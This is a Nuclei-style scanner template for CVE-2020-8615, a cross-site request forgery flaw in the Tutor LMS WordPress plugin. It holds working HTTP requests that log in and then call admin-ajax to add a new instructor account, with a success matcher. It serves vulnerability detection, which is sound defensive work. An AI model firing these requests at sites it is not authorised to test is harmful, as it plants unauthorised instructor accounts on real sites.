http:
- matchers:
  - condition: and
    dsl:
    - contains(content_type_2, "application/json")
    - contains(body_2, "success") && contains(body_2, "true") && contains(body_2,
      "Instructor has been added successfully")
    - status_code_2 == 200
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=add_new_instructor&first_name={{firstname}}&last_name={{lastname}}&user_login={{user}}&email={{email}}&phone_number=1231231231&password={{pass}}&password_confirmation={{pass}}&tutor_profile_bio=Et+tempore+culpa+n&action=tutor_add_instructor

    '
id: CVE-2020-8615
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:themeum:tutor_lms:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2020-8615
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
    cvss-score: 6.5
    cwe-id: CWE-352
    epss-percentile: 0.73312
    epss-score: 0.00479
  description: 'A CSRF vulnerability in the Tutor LMS plugin before 1.5.3 for WordPress
    can result in an attacker approving themselves as an instructor and performing
    other malicious actions (such as blocking legitimate instructors).

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: tutor_lms
    publicwww-query: /wp-content/plugins/tutor/
    vendor: themeum
    verified: true
  name: Wordpress Plugin Tutor LMS 1.5.3 - Cross-Site Request Forgery
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2020-8615
  - https://wpscan.com/vulnerability/10058
  - http://packetstormsecurity.com/files/156585/WordPress-Tutor-LMS-1.5.3-Cross-Site-Request-Forgery.html
  - https://wpvulndb.com/vulnerabilities/10058
  - https://www.getastra.com/blog/911/plugin-exploit/cross-site-request-forgery-in-tutor-lms-plugin/
  remediation: update to v.1.5.3
  severity: medium
  tags: cve,cve2020,wpscan,packetstorm,csrf,wp-plugin,wp,tutor,wordpress,themeum
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
  firstname: '{{rand_base(5)}}'
  lastname: '{{rand_base(5)}}'
  pass: '{{rand_base(8)}}'
  user: '{{rand_base(6)}}'
